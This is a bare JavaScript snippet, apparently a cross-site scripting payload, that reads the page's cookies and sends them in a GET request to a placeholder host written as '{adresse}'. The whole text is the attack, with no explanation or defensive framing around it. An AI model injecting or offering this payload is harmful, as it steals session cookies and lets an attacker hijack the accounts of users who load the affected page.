var cookie = document.cookie;
httpRequest = new XMLHttpRequest();
httpRequest.open('GET', 'http://{adresse}/index.js?session=' + cookie);
httpRequest.send();
